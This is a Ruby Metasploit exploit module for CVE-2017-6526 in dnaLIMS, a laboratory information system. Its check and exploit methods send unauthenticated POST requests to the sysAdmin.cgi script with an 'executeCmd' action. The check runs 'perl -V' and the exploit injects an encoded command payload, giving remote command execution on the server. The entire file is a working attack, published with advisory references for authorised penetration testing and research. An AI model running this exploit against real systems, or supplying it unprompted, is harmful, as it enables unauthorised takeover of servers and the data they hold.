# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;dnaLIMS Admin Module Command Execution&#039;,
      &#039;Description&#039;    => %q{
          This module utilizes an administrative module which allows for
       command execution.  This page is completely unprotected from any
       authentication when given a POST request.
      },
      &#039;Author&#039;         =>
        [
          &#039;h00die <mike@shorebreaksecurity.com>&#039;,  # Discovery, PoC
          &#039;flakey_biscuit <nicholas@shorebreaksecurity.com>&#039; # Discovery, PoC
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2017-6526&#039;],
          [&#039;US-CERT-VU&#039;, &#039;929263&#039;],
          [&#039;URL&#039;, &#039;https://www.shorebreaksecurity.com/blog/product-security-advisory-psa0002-dnalims/&#039;]
        ],
      &#039;Platform&#039;       => %w( linux unix ),
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Payload&#039;        =>
        {
          &#039;Space&#039;       => 1024,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;RequiredCmd&#039; => &#039;perl&#039; # software written in perl, and guaranteed to be there
            }
        },
      &#039;Targets&#039;        =>
        [
          [ &#039;Automatic Target&#039;, { }]
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;Mar 8 2017&#039;
      ))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to dnaLIMS&#039;, &#039;/cgi-bin/dna/&#039;])
      ], self.class
    )
  end

  def check
    begin
      res = send_request_cgi(
        &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;sysAdmin.cgi&#039;),
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039;  => {
          &#039;investigator&#039; => &#039;&#039;,
          &#039;username&#039; => &#039;&#039;,
          &#039;navUserName&#039; => &#039;&#039;,
          &#039;Action&#039; => &#039;executeCmd&#039;,
          &#039;executeCmdData&#039; => &#039;perl -V&#039;
        }
      )
      if res && res.body
        if /Summary of/ =~ res.body
          Exploit::CheckCode::Vulnerable
        else
          Exploit::CheckCode::Safe
        end
      else
        Exploit::CheckCode::Safe
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end

  def exploit
    begin
      vprint_status(&#039;Sending Exploit&#039;)
      res = send_request_cgi(
        &#039;uri&#039;       => normalize_uri(target_uri.path, &#039;sysAdmin.cgi&#039;),
        &#039;method&#039;    => &#039;POST&#039;,
        &#039;vars_post&#039;  => {
          &#039;investigator&#039; => &#039;&#039;,
          &#039;username&#039; => &#039;&#039;,
          &#039;navUserName&#039; => &#039;&#039;,
          &#039;Action&#039; => &#039;executeCmd&#039;,
          &#039;executeCmdData&#039; => payload.encoded,
        }
      )
      vprint_good(res.body)
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
end

